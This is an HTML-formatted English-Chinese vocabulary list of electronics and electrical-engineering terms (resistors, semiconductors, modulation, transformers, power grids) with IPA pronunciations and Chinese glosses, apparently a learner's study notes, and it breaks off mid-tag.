<p>inductive，归纳法的;归纳的;电感应的</p>  <p>varistor，[vəˈrɪstər]压敏电阻；可变（可调）电阻；非线性电阻；变阻器</p>  <p>vary，变化</p>  <p><span style="color:#fe2c24;">thermistor，</span>[ˈθɜːrmɪstər]温度传感器;热敏电阻</p>  <p><span style="color:#fe2c24;">thermocouple&nbsp;</span>&nbsp;[ˈθɜːrməˌkʌpl]热电偶</p>  <p>thermal热的;热量的;保暖的;防寒的;温暖的</p>  <p>wafer晶片，薄片</p>  <p><span style="color:#fe2c24;">semiconductor</span>，&nbsp;[ˈsemikəndʌktər]半导体；半导体装置</p>  <p><span style="color:#fe2c24;">conductor </span>&nbsp;[kənˈdʌktər]<span style="color:#fe2c24;">导体;</span>(管弦乐队、合唱队等的)指挥员;列车长</p>  <p><span style="color:#fe2c24;">nonconductor&nbsp;</span>&nbsp;[ˌnɒnkənˈdʌktə(r)]非导体；电介体；绝缘体</p>  <p><span style="color:#fe2c24;">conduct，传导（热或者电等能量）；</span>实施执行；行为举止；</p>  <p>conductive导电(或热等)的;能传导(电、热等)的</p>  <p>conduction (热或电等能量的)传导</p>  <p>PN junction&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PN结</p>  <p><span style="color:#fe2c24;">bipolar</span>，[ˌbaɪˈpoʊlər]双极性的</p>  <p>polarity极性(两极并存的状态);(两种倾向、意见等的)截然对立，两极化</p>  <p>polarize，[ˈpoʊləraɪz]极化;(使)两极化;截然对立;使(光波等)偏振;</p>  <p>pole(行星的)极;磁极;电极;杆子;</p>  <p>biasing circuit偏置电路</p>  <p><span style="color:#fe2c24;">bias</span>，&nbsp;[ˈbaɪəs]偏见、偏心；偏的</p>  <p>alias，又名，化名</p>  <p>forward biased正向偏置</p>  <p>reverse biased反向偏置</p>  <p>supply提供、供应；电源</p>  <p><span style="color:#fe2c24;">presentation&nbsp;</span>&nbsp;[ˌpriːz(ə)nˈteɪʃ(ə)n]展示会，介绍会，发布会；陈述，报告，说明；;</p>  <p><span style="color:#fe2c24;">representation&nbsp;</span>&nbsp;[ˌreprɪzenˈteɪʃ(ə)n]代理人，代表；描绘，表现；表示，象征；</p>  <p>number <span style="color:#fe2c24;">representation</span>数字表示（法）</p>  <p>represent代表;作为…的代言人;维护…的利益;</p>  <p>combinatorial logic circuit组合逻辑电路</p>  <p><span style="color:#fe2c24;">combinatorial，</span>[kəmˌbaɪnəˈtɔrɪəl]组合的</p>  <p>combine</p>  <p>combination</p>  <p>sequential logic circuit时序逻辑电路</p>  <p><span style="color:#fe2c24;">sequential&nbsp;&nbsp;</span>&nbsp;[sɪˈkwenʃ(ə)l]连续的;顺序的，按次序的;相继的;序列的</p>  <p>subsequent后来的;随后的;之后的;接后的</p>  <p>invaluable asset无价之宝</p>  <p>invaluable极宝贵的，无价的</p>  <p>asset资产，财产;有用的人(或事物)，优点，长处，有利条件</p>  <p>Emphasis（n）强调</p>  <p>emphasize强调</p>  <p><span style="color:#fe2c24;">bachelor&nbsp;</span>[ˈbætʃələr]单身汉;学士</p>  <p><span style="color:#fe2c24;">Utilize&nbsp;</span>&nbsp;[ˈjuːtəlaɪz]使用;利用;运用;应用</p>  <p>utility公用事业;实用;效用;有用;实用程序;公用程序</p>  <p>practical实际的，真实的</p>  <p>impractical不切实际的;不现实的;</p>  <p><span style="color:#fe2c24;">managerial&nbsp;</span>&nbsp;[ˌmænəˈdʒɪriəl]经理的;管理的</p>  <p><span style="color:#fe2c24;">ethical&nbsp;</span>[ˈeθɪk(ə)l]道德的;合乎道德的;伦理的</p>  <p>ethic行为准则，道德规范，伦理标准；信仰</p>  <p>ethnic（有关）种族的，民族的；少数民族的；</p>  <p><span style="color:#fe2c24;">faculty&nbsp;</span>&nbsp;[ˈfæk(ə)lti]能力;天赋;才能</p>  <p>talent天赋，才能；天才，人才；</p>  <p>talented有天资的，有才能的</p>  <p><span style="color:#fe2c24;">facility&nbsp;</span>[fəˈsɪləti]设施，设备；卫生间；天赋，才能；（机器等的）特别装置</p>  <p><span style="color:#fe2c24;">facilitate&nbsp;</span>&nbsp;[fəˈsɪlɪteɪt]促进;促使;使便利</p>  <p><span style="color:#fe2c24;">dielectric&nbsp;</span>&nbsp;[ˌdaɪɪˈlektrɪk]电介质；非传导性的；绝缘体</p>  <p>electric电的;用电的;电动的;发电的</p>  <p>electricity电;电能;电流，电力；</p>  <p>electrical电的，与电有关的;电气设备，电路；</p>  <p><span style="color:#fe2c24;">electrostatic&nbsp;</span>&nbsp;[ɪˌlektroʊˈstætɪk]静电的</p>  <p>static electricity静电</p>  <p><span style="color:#fe2c24;">electronic&nbsp;</span>&nbsp;[ɪˌlekˈtrɑːnɪk]电子的;电子器件的;电子设备的</p>  <p>nonelectronic非电子的</p>  <p><span style="color:#fe2c24;">electron </span>&nbsp;[ɪˈlektrɑːn]<span style="color:#fe2c24;">电子</span></p>  <p><span style="color:#fe2c24;">atom </span>&nbsp;[ˈætəm]<span style="color:#fe2c24;">原子</span></p>  <p><span style="color:#fe2c24;">ion </span>&nbsp;[ˈaɪənˌˈaɪɑːn]<span style="color:#fe2c24;">离子</span></p>  <p><span style="color:#fe2c24;">proton </span>&nbsp;[ˈproʊtɑːn]<span style="color:#fe2c24;">质子</span></p>  <p><span style="color:#fe2c24;">molecule，</span>[ˈmɑːlɪkjuːl]<span style="color:#fe2c24;">分子</span></p>  <p>electricity电;电能</p>  <p><span style="color:#fe2c24;">magnetic，</span>&nbsp;[mæɡˈnetɪk]有磁性的;磁性的;磁的;</p>  <p><span style="color:#fe2c24;">magnet</span>，&nbsp;[ˈmæɡnət]磁体，磁铁；有吸引力的人（或地方、事物）</p>  <p>electromagnetic电磁的</p>  <p>electromagnet电磁体</p>  <p>magnetron磁（控）电（子）管</p>  <p><span style="color:#fe2c24;">telecommunication&nbsp;</span>&nbsp;[ˌtelikəˌmjuːnɪˈkeɪʃ(ə)n]电讯，远程通信，无线电通讯；电信学；电信信息</p>  <p><span style="color:#fe2c24;">mechanic </span>&nbsp;[məˈkænɪk]<span style="color:#fe2c24;">技工;机械师;机械修理工;力学;机械学；</span></p>  <p><span style="color:#fe2c24;">mechanical </span>&nbsp;[məˈkænɪk(ə)l]<span style="color:#fe2c24;">机动的，机械的</span></p>  <p><span style="color:#fe2c24;">mechanism </span>&nbsp;[ˈmekənɪzəm]<span style="color:#fe2c24;">机械装置，机械构造</span></p>  <p><span style="color:#fe2c24;">electrodynamic&nbsp;</span>&nbsp;[ɪˌlektroʊdaɪˈnæmɪk]电动的，电动力（学）的</p>  <p><span style="color:#fe2c24;">thermodynamic</span>热力学</p>  <p>thermo热的，热量的；温度的；热电的</p>  <p>thermal热的，热量的；（衣服）保暖的，御寒的；</p>  <p><span style="color:#fe2c24;">dynamic</span>动态;动力;动态的;动力的;充满活力的</p>  <p><span style="color:#fe2c24;">pneumatic</span>， [nuːˈmætɪk]充气的;气胎</p>  <p><span style="color:#fe2c24;">precision，</span>&nbsp;[prɪˈsɪʒ(ə)n]<span style="color:#fe2c24;">精确;准确;细致；（设计）精密的，精确的；</span></p>  <p><span style="color:#fe2c24;">precisely </span>&nbsp;[prɪˈsaɪsli]<span style="color:#fe2c24;">准确地;确切地;精确地;明确地</span></p>  <p><span style="color:#fe2c24;">precise准确的;确切的;精确的;明确的</span></p>  <p>up-to-date最新的;现代的</p>  <p>counter计数器</p>  <p><span style="color:#fe2c24;">encounter</span>遭遇;遇到</p>  <p>encode编码</p>  <p>unencode解码</p>  <p>encoded编码的</p>  <p>unencoded解码的</p>  <p><span style="color:#fe2c24;">codec&nbsp;</span>&nbsp;[ˈkodɛk]编码译码器</p>  <p>compression压缩</p>  <p>decompression解压</p>  <p>compress(被)压紧;精简;浓缩;压缩(文件等)</p>  <p>press按;(被)压;</p>  <p>module单元;模块;功能块;程序块;组件;</p>  <p><span style="color:#fe2c24;">modular&nbsp;</span>&nbsp;[ˈmɑːdʒələr]模块化的;标准组件的</p>  <p><span style="color:#fe2c24;">modularization</span>模块化</p>  <p><span style="color:#fe2c24;">modulate&nbsp;</span>[ˈmɑːdʒəleɪt]调节；（信号）调制；调整</p>  <p><span style="color:#fe2c24;">modulation</span>调制</p>  <p>demodulation解调</p>  <p><span style="color:#fe2c24;">modem</span>&nbsp;[ˈmoʊdəm]调制解调器</p>  <p>modern近代的，现代的；当代风格的，现代派的；现代化的，新式的；</p>  <p>modulator调制器</p>  <p>demodulator解调器</p>  <p>charge充电,电荷;控告，指控；要价，收费（金额）</p>  <p>Discharge放电</p>  <p>disconnected断开的，无连接的</p>  <p>recharge给(电池)充电;恢复体力;恢复精力;</p>  <p><span style="color:#fe2c24;">omit，</span>&nbsp;[əˈmɪt]省略;忽略;遗漏;</p>  <p>emit，[iˈmɪt]排放，散发（尤指气体、辐射物）；发出（声音或噪音）；发行，发表</p>  <p>emit发出;射出;散发(光、热、声音、气等)</p>  <p>emitter发射器</p>  <p>transmit传输;发射;传送;</p>  <p>transition转变;变革;变迁</p>  <p>emission排放;(光、热、气等的)发出;射出;排放物;散发物</p>  <p>satellite卫星；卫星的</p>  <p><span style="color:#fe2c24;">dime</span>一角硬币;(美国、加拿大的)十分硬币，十分钱</p>  <p>dimensional维度的，空间的，尺寸的</p>  <p><span style="color:#fe2c24;">dimension,</span>[daɪˈmenʃn; dɪˈmenʃn]维度；尺寸；空间</p>  <p>aircraft飞机;航空器</p>  <p><span style="color:#fe2c24;">vehicle</span>,&nbsp;[ˈviːək(ə)l]交通工具;车辆</p>  <p><span style="color:#fe2c24;">orbit&nbsp;</span>&nbsp;[ˈɔːrbɪt]轨道、沿轨道运行</p>  <p>air-traffic空中交通</p>  <p><span style="color:#fe2c24;">radar</span>，&nbsp;[ˈreɪdɑːr]雷达</p>  <p>domestic power plugs家用电源插头</p>  <p>domestic本国的;国内的;家用的</p>  <p>plug插头</p>  <p>socket(电源)插座;(电器上的)插口，插孔</p>  <p>single phase单相</p>  <p>phase相位、阶段；月亮的盈亏</p>  <p><span style="color:#fe2c24;">phasor</span>，[ˈfeɪzər]相量;矢量;相矢量;相位;</p>  <p><span style="color:#fe2c24;">phrase&nbsp;</span>&nbsp;[freɪz]短语;词组;成语;习语;</p>  <p>period一段时间，时期;（人生或国家历史的）阶段;函数周期</p>  <p>periodically &nbsp;[ˌpɪriˈɑːdɪkli]定期地;定期;周期性;</p>  <p>pulse width脉冲宽度</p>  <p><span style="color:#fe2c24;">neutral&nbsp;</span>[ˈnuːtrəl]中立的;中性的;中立者;中立国</p>  <p>plus a neutral加上一个中性点</p>  <p><span style="color:#fe2c24;">appliance&nbsp;</span>&nbsp;[əˈplaɪəns]器具;(家用)电器</p>  <p>portable便携式的;手提的;轻便的</p>  <p><span style="color:#fe2c24;">oxide&nbsp;</span>&nbsp;[ˈɑːksaɪd]氧化物</p>  <p>manganese&nbsp;[ˈmæŋɡəniːz]锰</p>  <p>iron铁</p>  <p>silver银</p>  <p>copper铜</p>  <p><span style="color:#fe2c24;">brass&nbsp;</span>[bræs]黄铜</p>  <p>Zinc锌</p>  <p>tin锡;罐;罐头盒;罐头</p>  <p>nickel镍</p>  <p>silicon硅</p>  <p><span style="color:#fe2c24;">carbon&nbsp;</span>&nbsp;[ˈkɑːrbən]碳</p>  <p>crystal结晶、晶体</p>  <p>mica云母</p>  <p><span style="color:#fe2c24;">ceramic&nbsp;</span>[səˈræmɪk]陶瓷</p>  <p><span style="color:#fe2c24;">aluminum&nbsp;</span>&nbsp;[əˈluːmɪnəm]铝</p>  <p><span style="color:#fe2c24;">foil&nbsp;</span>&nbsp;[fɔɪl]箔，箔纸</p>  <p>epoxy环氧树脂</p>  <p>germanium锗</p>  <p><span style="color:#fe2c24;">coal&nbsp;</span>&nbsp;[koʊl]煤</p>  <p><span style="color:#fe2c24;">Blade&nbsp;</span>&nbsp;[bleɪd]刀身;刀片;刀刃</p>  <p><span style="color:#fe2c24;">variant&nbsp;</span>&nbsp;[ˈveriənt]变种、变体；变异的、不同的</p>  <p><span style="color:#fe2c24;">invariant&nbsp;</span>&nbsp;[ɪnˈveriənt]不变的;恒定的</p>  <p>invariance &nbsp;[ɪnˈverɪəns]不变性</p>  <p>time-invariance时不变</p>  <p>various各种各样的，不同的;</p>  <p>variety不同种类，多种式样</p>  <p>variation变异;(数量、水平等的)变化;变更;</p>  <p>variable变量;可变情况;可变因素;可变的;多变的;易变的;变化无常的;可更改的</p>  <p>vary (v)变化;(大小、形状等)相异;不同;有别</p>  <p>domain域、领域、区域</p>  <p>multi domain多区域;多领域;多域</p>  <p><span style="color:#fe2c24;">dominant&nbsp;</span>&nbsp;[ˈdɑːmɪnənt]占主导地位;占优势的</p>  <p><span style="color:#fe2c24;">domination&nbsp;</span>&nbsp;[ˌdɑːmɪˈneɪʃ(ə)n]统治;控制</p>  <p><span style="color:#fe2c24;">integration&nbsp;</span>[ˌɪntɪˈɡreɪʃ(ə)n]集成</p>  <p>integrated集成的</p>  <p>integrate整合，使成一体</p>  <p>integral完整的，整体</p>  <p><span style="color:#fe2c24;">causality&nbsp;</span>[kɔːˈzæləti]因果关系;因果律</p>  <p>fourier傅立叶</p>  <p><span style="color:#fe2c24;">correlation&nbsp;</span>[ˌkɔːrəˈleɪʃ(ə)n]相关性;相关;关联</p>  <p><span style="color:#fe2c24;">spectral&nbsp;</span>&nbsp;[ˈspektrəl]幽灵似的;光谱的;谱的</p>  <p><span style="color:#fe2c24;">density&nbsp;</span>&nbsp;[ˈdensəti]密集;稠密;浓度;密度</p>  <p>laplace拉普拉斯</p>  <p>elementary初级的;基本的;基础的</p>  <p>primary初级的;基本的;主要的;最重要的;</p>  <p>prime首要的，基本的</p>  <p>aspect方面;层面;外观</p>  <p>specialist专家;专业人员;专业的</p>  <p>passive消极的</p>  <p>passive component无源器件</p>  <p>active component有源器件</p>  <p>subcomponent子组件;</p>  <p>undertake承担，负责</p>  <p>lowpass低通</p>  <p>highpass高通</p>  <p>bandpass带通</p>  <p><span style="color:#fe2c24;">cascade&nbsp;</span>[kæˈskeɪd]大量、倾泻，（使）串联</p>  <p>butterworth巴特沃兹（滤波器）</p>  <p>chebyshev切比雪夫</p>  <p><span style="color:#fe2c24;">ladder&nbsp;</span>[ˈlædər]梯子</p>  <p>feedback反馈</p>  <p><span style="color:#fe2c24;">negative feedback</span>负反馈</p>  <p>sound牢固的;声音</p>  <p>acquire(通过努力、能力、行为表现)获得;购得;得到</p>  <p>inquiry调查;查询;询问;打听;(官方的)查问;</p>  <p>query查询;询问;</p>  <p><span style="color:#fe2c24;">progression&nbsp;</span>&nbsp;[prəˈɡreʃn]进展;进程;前进;</p>  <p>formula公式，方程式</p>  <p>formulation配方;阐述方式，表达方法</p>  <p>equation方程式;方程;等式;相等</p>  <p><span style="color:#fe2c24;">theorem&nbsp;</span>[ˈθiːərəm]<span style="color:#fe2c24;">&nbsp;</span>[数] 定理；原理</p>  <p>arithmetic算术;演算，计算;算术的，运算的</p>  <p><span style="color:#fe2c24;">algebra&nbsp;</span>&nbsp;[ˈældʒɪbrə]代数</p>  <p><span style="color:#fe2c24;">algebraic&nbsp;</span>&nbsp;[ˌældʒɪˈbreɪɪk]代数的</p>  <p>algebraically用代数；用代数的方法</p>  <p>geometrical几何的，几何学的</p>  <p>compute计算;估算</p>  <p>computation计算;计算过程</p>  <p>distribute分配;分发</p>  <p>distribution分配;分发</p>  <p><span style="color:#fe2c24;">disturbance&nbsp;</span>&nbsp;[dɪˈstɜːrbəns]骚乱;障碍;紊乱;(受)打扰，干扰，妨碍</p>  <p>disturb&nbsp;打扰，妨碍；使焦虑，使烦恼；移动，弄乱</p>  <p><span style="color:#fe2c24;">inject&nbsp;</span>&nbsp;[ɪnˈdʒekt](给…)注射(药物等);(给…)添加，增加(某品质);（给…）投入（资金）</p>  <p>injection注射;大量资金的投入;(液体)注入，喷入注射;大量资金的投入;(液体)注入，喷入</p>  <p>rejection拒绝;否决;抛弃;拒斥</p>  <p>disturbance rejection干扰抑制</p>  <p><span style="color:#fe2c24;">criterion</span>&nbsp;[kraɪˈtɪriən]标准;(评判或作决定的)准则;原则</p>  <p><span style="color:#fe2c24;">derivative&nbsp;</span>&nbsp;[dɪˈrɪvətɪv]派生词;衍生物; 衍生字 ;派生物</p>  <p>locus发生地;(某事发生的)确切地点</p>  <p><span style="color:#fe2c24;">sketch&nbsp;</span>[sketʃ]素描;速写;草图</p>  <p>compensate补偿;弥补;</p>  <p>compensator补偿器</p>  <p>compensation(对不利局面的)补偿;赔偿;补偿(或赔偿)物;(尤指)赔偿金;补偿金</p>  <p>lag compensator滞后补偿器</p>  <p>lag&nbsp;掉队，落后于；</p>  <p>tag标签;给…加上标签;</p>  <p><span style="color:#fe2c24;">complement&nbsp;</span>&nbsp;[ˈkɑːmplɪment]补足;补充;</p>  <p><span style="color:#fe2c24;">complementary&nbsp;</span>&nbsp;[ˌkɑːmplɪˈment(ə)ri]互补的;补充的;相互补足的</p>  <p>calibration标定;校准;(温度计或其他仪表上的)刻度</p>  <p><span style="color:#fe2c24;">rectification&nbsp;</span>[ˌrektɪfɪˈkeɪʃn]纠正;修正;矫正;校正</p>  <p><span style="color:#fe2c24;">rectify&nbsp;</span>&nbsp;[ˈrektɪfaɪ]矫正;纠正;改正</p>  <p><span style="color:#fe2c24;">rectifier&nbsp;</span>&nbsp;[ˈrektəˌfaɪər]整流器</p>  <p>bridge rectifier整流桥</p>  <p>analog模拟</p>  <p>analogue模拟的</p>  <p>analogy类比;比拟;比喻;类推</p>  <p>analogous相似的;类似的</p>  <p>nyquist奈奎斯特</p>  <p>estimator估计量；估计值</p>  <p><span style="color:#fe2c24;">estimate&nbsp;</span>&nbsp;[ˈestɪmət]估计;估算;估价</p>  <p>estimation判断;评价;看法;(对水平、数量等的)估计</p>  <p><span style="color:#fe2c24;">evaluate&nbsp;</span>&nbsp;[ɪˈvæljueɪt]估计;评价;评估</p>  <p>photonic光子;光学</p>  <p>photon光子;光量子</p>  <p>photoresistor光敏电阻（器），光电导管</p>  <p>photoreceptor光感受器</p>  <p>photosensor光电传感器</p>  <p>sense感觉;知觉;感觉官能</p>  <p>sensation感觉;知觉;感觉能力;</p>  <p>sensor传感器</p>  <p>sensory感觉的;知觉的;感官的</p>  <p>photograph照片;相片</p>  <p>photography照相术;摄影</p>  <p>photographic摄影的;摄制的;照片的</p>  <p>photocopier复印机;影印机</p>  <p>photocopy影印;复印;复印件;影印本</p>  <p>photoconductive光电导的；光敏的</p>  <p>graph图表;图;</p>  <p><span style="color:#fe2c24;">graphic&nbsp;</span>&nbsp;[ˈɡræfɪk]图解的;绘画的;书画的;图样的;图案的;图表，图形</p>  <p>graphical绘画的;计算机图形的;用图(或图表等)表示的</p>  <p>graphically以书画(或图表)形式;形象地;生动地;逼真地</p>  <p>graphic card显卡;显示卡;图形卡;</p>  <p>subsystem子系统;子体系;子系统类;</p>  <p><span style="color:#fe2c24;">grasp&nbsp;</span>&nbsp;[ɡræsp]抓住;理解;领会;</p>  <p>oscillator振荡器</p>  <p>oscillate摇摆，变化;摆动;振动;波动;振荡</p>  <p>oscillation摆动;摇摆;振动;一次波动;浮动</p>  <p><span style="color:#fe2c24;">oscilloscope&nbsp;</span>&nbsp;[əˈsɪləskoʊp]示波器;示波管</p>  <p>tone语气;口气;腔调;口吻;语调</p>  <p>tune曲调;曲子;(为乐器)调音，校音;调整，调节(发动机);调谐，调频;调整</p>  <p>tunable可调;可调式;可调的;可调谐;可调优组件</p>  <p>tuner调谐器</p>  <p>phase locked loops锁相环</p>  <p>microwave微波炉</p>  <p>microwave oven微波炉</p>  <p><span style="color:#fe2c24;">laser&nbsp;</span>&nbsp;[ˈleɪzər]激光，激光器</p>  <p>assume假定;假设</p>  <p>converter转换器;整流器;变流器;(改变无线电信号的)变频器</p>  <p><span style="color:#fe2c24;">convert&nbsp;</span>[kənˈvɜːrt]转换;(使)转变;转化;</p>  <p><span style="color:#fe2c24;">converse&nbsp;</span>&nbsp;[kənˈvɜːrs]交谈;谈话;相反的事物;(事实或陈述的)反面;相反的，逆的，颠倒的</p>  <p>conversely相反地;反过来</p>  <p>conversion转变;转换;转化</p>  <p>conversation会话;(非正式)交谈，谈话</p>  <p>inert无活动能力的;无行动力的;惰性的;不活泼的</p>  <p>insert插入;嵌入;(在文章中)添加，加插</p>  <p><span style="color:#fe2c24;">invert&nbsp;</span>&nbsp;[ɪnˈvɜːrt](使)倒转，颠倒，倒置;（使）反向;</p>  <p>inverter变换（压、流、频）器；倒换（倒相、反演、反相）器；逆变器；“非”门（电路）</p>  <p>inverted反向的，倒转的，颠倒的，（尤指）倒置的</p>  <p><span style="color:#fe2c24;">inverting反向输入</span></p>  <p><span style="color:#fe2c24;">noninverting同向输入</span></p>  <p>inversely相反的</p>  <p><span style="color:#fe2c24;">reverse&nbsp;</span>&nbsp;[rɪˈvɜːrs]颠倒;彻底转变;使完全相反;相反的;反面的;反向的;背面的;后面的</p>  <p>ohm law 欧姆定律</p>  <p>straight line直线</p>  <p>linear device线性元件</p>  <p>nonlinear非线性</p>  <p>linearity（直）线性；线性度</p>  <p>thereby因此;由此;从而</p>  <p>voltage divider分压器</p>  <p>composition作文;成分;构成</p>  <p><span style="color:#fe2c24;">composite&nbsp;</span>&nbsp;[kəmˈpɑːzət]复合的;合成的;混成的;复合材料;合成物;混合物</p>  <p><span style="color:#fe2c24;">compose </span>[kəmˈpoʊz]（v）组成;作曲;构成(一个整体)</p>  <p>be composed of由…组成</p>  <p>consist of包括;由…组成（构成）</p>  <p>consist包括;在于;由…组成;</p>  <p><span style="color:#fe2c24;">consistent&nbsp;</span>[kənˈsɪstənt]一致的;始终如一的;连续的;持续的;</p>  <p>make up组成</p>  <p><span style="color:#fe2c24;">comprise&nbsp;</span>[kəmˈpraɪz]包含;包括;组成;构成;由…组成;</p>  <p>consist，由……组成</p>  <p>consists of，包含，由……组成</p>  <p>comprises包括</p>  <p>wire-wound绕线</p>  <p>film电影;影片;胶片;薄薄的一层</p>  <p><span style="color:#fe2c24;">metal film金属膜</span></p>  <p>power rating功率;额定功率</p>  <p><span style="color:#fe2c24;">tolerance&nbsp;</span>[ˈtɑːlərəns]误差</p>  <p>serve&nbsp;as用作;作为；充当</p>  <p>load负载</p>  <p>preloaded预装入;预装入的;预载;预装载</p>  <p>spring-loaded弹簧承载的;弹顶的</p>  <p><span style="color:#fe2c24;">springy </span>&nbsp;[ˈsprɪŋi]<span style="color:#fe2c24;">有弹性的</span></p>  <p>plot情节;阴谋;绘制(图表);绘制（曲线）;设计情节</p>  <p>rheostat变阻器;可变电阻;可变电阻器;</p>  <p>essentially本质上;根本上;基本上</p>  <p><span style="color:#fe2c24;">essential&nbsp;</span>[ɪˈsenʃ(ə)l]根本的;本质的;必不可少的;完全必要的;</p>  <p>essence本质;实质;</p>  <p><span style="color:#fe2c24;">potential&nbsp;</span>&nbsp;[pəˈtenʃ(ə)l]潜在的;可能的;电位;电势;电压</p>  <p>metre米；公尺</p>  <p>meter米;计;表;仪;</p>  <p>potentiometers电位器;</p>  <p><span style="color:#fe2c24;">multimeter </span>[ˈmʌltɪmiːtə(r)]<span style="color:#fe2c24;">万用（复用）表</span></p>  <p><span style="color:#fe2c24;">voltmeter</span>&nbsp;[ˈvoʊltmiːtər]<span style="color:#fe2c24;">伏特计;电压表</span></p>  <p><span style="color:#fe2c24;">ammeter</span>&nbsp;[ˈæmiːtər]<span style="color:#fe2c24;">电流表;安培计</span></p>  <p><span style="color:#fe2c24;">diameter </span>&nbsp;[daɪˈæmɪtər]<span style="color:#fe2c24;">直径;对径;放大率;放大倍数</span></p>  <p><span style="color:#fe2c24;">centimeter </span>&nbsp;[ˈsentɪmiːtər]<span style="color:#fe2c24;">厘米</span></p>  <p><span style="color:#fe2c24;">millimeter </span>&nbsp;[ˈmɪlimiːtər]<span style="color:#fe2c24;">毫米</span></p>  <p>micron微米</p>  <p><span style="color:#fe2c24;">nanometer&nbsp;</span>&nbsp;[ˈnænoʊmiːtər]纳米</p>  <p>trimmer微调器</p>  <p>coil线圈;绕组;</p>  <p>violet紫罗兰;蓝紫色;紫罗兰色</p>  <p>inche英寸</p>  <p>probe探查;探究;盘问;追问;探测仪</p>  <p>drop滴;下降;下跌;落下，掉下，使落下</p>  <p><span style="color:#fe2c24;">insulate&nbsp;</span>[ˈɪnsəleɪt]使隔热;使隔音;使绝缘;使免除(不愉快的经历);使免受(不良影响);隔离</p>  <p><span style="color:#fe2c24;">insulating</span>绝缘</p>  <p><span style="color:#fe2c24;">insulator</span>绝缘体;隔热(或绝缘、隔音等的)材料(或装置)</p>  <p><span style="color:#fe2c24;">isolate&nbsp;</span>[ˈaɪsəleɪt]孤立，分离；隔离；单独考虑</p>  <p>sandwich三明治;夹心面包片;夹心蛋糕</p>  <p><span style="color:#fe2c24;">cylinder&nbsp;</span>&nbsp;[ˈsɪlɪndər]圆柱;圆筒</p>  <p>flat平的;水平的;平滑的;扁平的;</p>  <p><span style="color:#fe2c24;">rough&nbsp;</span>[rʌf]粗糙的;不平滑的;高低不平的;</p>  <p>roughly粗略地;大致;大约;差不多;粗暴地;粗鲁地;粗糙地;凹凸不平地</p>  <p><span style="color:#fe2c24;">smooth&nbsp;</span>[smuːð]平整的;平坦的;平滑的;光滑的;使平整;使平坦;使平滑;使光滑</p>  <p>smoothly平稳地;顺利地;连续而流畅地;</p>  <p><span style="color:#fe2c24;">sleek&nbsp;</span>&nbsp;[sliːk]光滑的;时髦的;光亮的;</p>  <p><span style="color:#fe2c24;">coarse&nbsp;</span>[kɔːrs]粗糙的;粗织的;粗的;大颗粒的;粗鲁无礼的，粗俗的(尤指涉及性的)</p>  <p>block块;街区;阻碍;堵塞;阻塞;</p>  <p>farad法拉</p>  <p>significant重要的, 有重大意义的;</p>  <p>significantly有重大意义地;显著地;明显地;</p>  <p>rotate旋转</p>  <p><span style="color:#fe2c24;">stationary&nbsp;</span>&nbsp;[ˈsteɪʃəneri]不动的;静止的;固定的;</p>  <p><span style="color:#fe2c24;">screw&nbsp;</span>&nbsp;[skruː]螺丝钉;螺丝;旋紧;拧紧;</p>  <p><span style="color:#fe2c24;">screwdriver&nbsp;</span>&nbsp;[ˈskruːdraɪvər]螺丝刀</p>  <p>store商店；储存</p>  <p>air-core空气磁心</p>  <p><span style="color:#fe2c24;">transformer&nbsp;</span>&nbsp;[trænsˈfɔːrmər]变压器</p>  <p>transfer转移(感情);(使)搬迁;(使)调动;转职;</p>  <p><span style="color:#fe2c24;">toroidal&nbsp;</span>[toʊˈrɔɪdəl]环形;环形的;环状</p>  <p>tubular管子构成的;有管状部分的;管状的</p>  <p><span style="color:#fe2c24;">choke，</span>&nbsp;[tʃoʊk]窒息，噎住，卡住；说不出话，哽咽；掐死，扼死；堵塞，塞满；失去作用</p>  <p><span style="color:#fe2c24;">maintain，</span>&nbsp;[meɪnˈteɪn]维持;保持;维修;保养</p>  <p><span style="color:#fe2c24;">maintenance，</span>&nbsp;[ˈmeɪntənəns]维修;维护;保养;维持;</p>  <p>regardless of，不管，不顾</p>  <p><span style="color:#fe2c24;">coefficient，</span>[ˌkoʊɪˈfɪʃ(ə)nt](测定物质某种特性的)系数</p>  <p>efficient，有效率的;效率高的;</p>  <p>stable，稳定的，稳固的</p>  <p>stability稳定性;</p>  <p>stabilize稳定;(使)稳固</p>  <p>mount攀登;登上;安排;</p>  <p>amount数量;金额;数额;合计，共计;</p>  <p>init初始化;初始化函数;系统初始化</p>  <p><span style="color:#fe2c24;">initiate，</span>&nbsp;[ɪˈnɪʃieɪt]开始实施，发起；</p>  <p><span style="color:#fe2c24;">initial&nbsp;</span>&nbsp;[ɪˈnɪʃ(ə)l]最初的;开始的;第一的</p>  <p><span style="color:#fe2c24;">initialize&nbsp;</span>&nbsp;[ɪˈnɪʃəlaɪz]初始化</p>  <p>initialization起始；初始化；安置初始值</p>  <p>parallel [ˈpærəlel]平行的;并联的</p>  <p>serial连续的;多次的;</p>  <p>series系列;连续;接连</p>  <p><span style="color:#fe2c24;">in parallel with与……并行</span></p>  <p><span style="color:#fe2c24;">in series with与……串行</span></p>  <p>surge激增;（电流）浪涌</p>  <p>absorb吸收</p>  <p>bound跳跃;蹦跳</p>  <p>manner方式;方法;举止;态度;礼貌;礼仪;</p>  <p><span style="color:#fe2c24;">mutual&nbsp;</span>[ˈmjuːtʃuəl]相互的;彼此的;共有的;共同的;</p>  <p><span style="color:#fe2c24;">manual&nbsp;</span>&nbsp;[ˈmænjuəl]手册;说明书;指南</p>  <p><span style="color:#fe2c24;">manufacturer&nbsp;</span>[ˌmænjuˈfæktʃərər]制造商;生产商;生产者;制造者</p>  <p><span style="color:#fe2c24;">manufacturing&nbsp;</span>[ˌmænjuˈfæktʃərɪŋ]制造业，工业</p>  <p>tapped抽头的，抽头式</p>  <p>tap，轻拍，轻扣，轻敲；敲出节奏，打拍子；</p>  <p>center-tapped中心抽头式</p>  <p>step-up升压</p>  <p>step-down降压</p>  <p>power权力;能力;控制力;功率;能量</p>  <p><span style="color:#fe2c24;">power supply</span>电源</p>  <p>power switch电源开关</p>  <p><span style="color:#fe2c24;">power export</span>电力输出；输出功率</p>  <p>power grid电力网</p>  <p><span style="color:#fe2c24;">power plant</span>发电厂, 发电站;动力设备, 发电装置</p>  <p>power distribution grid配电网</p>  <p><span style="color:#fe2c24;">grid&nbsp;</span>&nbsp;[ɡrɪd]网格;方格;</p>  <p><span style="color:#fe2c24;">grip</span>紧握;紧抓;</p>  <p>power line输电线;电源线</p>  <p>distribution bus配电总线，电缆线</p>  <p>plant植物；发电厂；工厂</p>  <p>plane飞机</p>  <p>plate盘子;碟子;（玻璃、金属等）底片，感光板</p>  <p><span 